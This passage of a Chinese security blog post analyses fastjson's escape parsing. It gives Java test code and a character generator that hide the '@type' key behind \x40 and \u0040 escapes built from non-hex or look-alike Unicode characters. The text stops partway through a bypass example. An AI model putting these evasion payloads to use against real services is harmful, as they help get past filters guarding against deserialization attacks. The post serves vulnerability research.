+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;\x40type&#34;</span><span class="p">:</span><span class="s2">&#34;java.awt.Rectangle&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515211922148.png"
+	width="1142"
+	height="415"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515211922148_hu14305695984058740091.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515211922148_hu9936762714292599397.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260515211922148"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="275"
+		data-flex-basis="660px"
+	
+></p>
+<p>这里其实就是定义一个16进制的gigits，从0-9a-fA-F用于后续的运算,值得注意的是这里数组长度不能超<code>int(f)</code></p>
+<p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515212206024.png"
+	width="983"
+	height="257"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515212206024_hu3955433339148215335.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515212206024_hu15731453246758898979.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260515212206024"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="382"
+		data-flex-basis="917px"
+	
+></p>
+<p>当字符以x开头，也就是以hex解析的时候，先后获取x后的数字进行计算，如果不是hex字符这个值就为0，之前的<code>\x40</code>解析：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">digits</span><span class="o">[</span><span class="n">4</span><span class="o">]*</span><span class="n">16</span><span class="o">+</span><span class="n">digits</span><span class="o">[</span><span class="n">0</span><span class="o">]=</span><span class="n">0x40</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>根据上面的分析，填入任何非hex的字符都行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">digits</span><span class="o">[</span><span class="n">4</span><span class="o">]*</span><span class="n">16</span><span class="o">+</span><span class="n">digits</span><span class="o">[</span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="sc">&#39;J&#39;</span><span class="o">]=</span><span class="n">0x40</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">digits</span><span class="o">[</span><span class="n">4</span><span class="o">]*</span><span class="n">16</span><span class="o">+</span><span class="n">digits</span><span class="o">[</span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="sc">&#39;_&#39;</span><span class="o">]=</span><span class="n">0x40</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>测试代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Random</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">ghostTest</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w">  </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Random</span><span class="w"> </span><span class="n">random</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Random</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;java.awt.Rectangle\&#34;}&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;{\&#34;\\x40type\&#34;:\&#34;java.awt.Rectangle\&#34;}&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;{\&#34;\\x4&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">getRandomNonHexChar</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;type\&#34;:\&#34;java.awt.Rectangle\&#34;}&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;{\&#34;\\x4&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">getRandomNonHexChar</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;type\&#34;:\&#34;java.awt.Rectangle\&#34;}&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;{\&#34;\\x4&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">getRandomNonHexChar</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;type\&#34;:\&#34;java.awt.Rectangle\&#34;}&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;{\&#34;\\x4&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">getRandomNonHexChar</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;type\&#34;:\&#34;java.awt.Rectangle\&#34;}&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">json</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">s</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">s</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">e</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="nf">getRandomNonHexChar</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">char</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="na">nextInt</span><span class="p">(</span><span class="n">102</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">32</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">1</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">32</span><span class="p">);</span><span class="c1">//防止数组越界</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">boolean</span><span class="w"> </span><span class="n">isHex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="sc">&#39;0&#39;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="sc">&#39;9&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="sc">&#39;a&#39;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="sc">&#39;f&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="sc">&#39;A&#39;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="sc">&#39;F&#39;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">boolean</span><span class="w"> </span><span class="n">isJsonSpecial</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;&#34;&#39;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;\\&#39;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">isHex</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">isJsonSpecial</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="n">c</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515220402157.png"
+	width="792"
+	height="361"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515220402157_hu12125923604789759050.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515220402157_hu6151220531513528658.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260515220402157"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="219"
+		data-flex-basis="526px"
+	
+></p>
+<h3 id="u0040-bypass"><strong>\u0040</strong> bypass
+</h3><p>fastjson还支持另外一种绕过payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;\u0040type&#34;</span><span class="p">:</span><span class="s2">&#34;java.awt.Rectangle&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515222021640.png"
+	width="1246"
+	height="255"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515222021640_hu4672554811403254830.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515222021640_hu16473211812076154287.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260515222021640"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="488"
+		data-flex-basis="1172px"
+	
+></p>
+<p>这里以unicode解析会进这里</p>
+<p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515222141871.png"
+	width="1169"
+	height="683"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515222141871_hu5893818805254544738.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515222141871_hu13028796178644455710.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260515222141871"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="171"
+		data-flex-basis="410px"
+	
+></p>
+<p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515223709860.png"
+	width="897"
+	height="578"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515223709860_hu3451126106780269649.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515223709860_hu9717812495717317486.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260515223709860"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="155"
+		data-flex-basis="372px"
+	
+></p>
+<p>这里判断字符类型选择不同实例解析，跟进CharacterData01</p>
+<p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515223805879.png"
+	width="1036"
+	height="425"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515223805879_hu17524541026163000850.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515223805879_hu12262535183014597179.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260515223805879"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="243"
+		data-flex-basis="585px"
+	
+></p>
+<p>这里根据进制不同来解析，上面规定了16进制，所以不是16进制的字符返回<code>-1</code>,重点在于传进去的字符的char类型的，char在0-65535范围内有非常多的字符可以冒充hex字符。例如一些其他语言的字符（</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.ArrayList</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.List</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.TreeMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">GhostBitsGenerator</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">Integer</span><span class="p">,</span><span class="w"> </span><span class="n">List</span><span class="o">&lt;</span><span class="n">Character</span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">hexMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TreeMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">16</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">hexMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ArrayList</span><span class="o">&lt;&gt;</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 遍历 Java char 的全部范围 (0 到 65535)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">Character</span><span class="p">.</span><span class="na">MAX_VALUE</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">char</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="w"> </span><span class="n">i</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// 使用 Java 原生的 digit 方法判断该字符在 16进制下是否合法</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">int</span><span class="w"> </span><span class="n">hexValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Character</span><span class="p">.</span><span class="na">digit</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="w"> </span><span class="n">16</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// 如果返回值不是 -1，说明 Java 认为这是一个合法的 16 进制字符！</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">hexValue</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="o">-</span><span class="n">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">hexMap</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">hexValue</span><span class="p">).</span><span class="na">add</span><span class="p">(</span><span class="n">c</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">Integer</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">hexMap</span><span class="p">.</span><span class="na">keySet</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">hexMap</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">key</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515231131595.png"
+	width="1258"
+	height="493"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515231131595_hu12859180517899543381.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515231131595_hu8976229978156147931.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260515231131595"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="255"
+		data-flex-basis="612px"
+	
+></p>
+<p>然后bypass</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">ghostBits</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">ghostTest</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">Integer</span><span class="p">,</span><span class="w"> </span><span class="n">List</span><span class="o">&lt;</span><span class="n">Character</span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">hexMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GhostBitsGenerator</span><span class="p">.</span><span class="na">getHexMap</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w">  </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Random</span><span class="w"> </span><span class="n">random</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Random</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w">
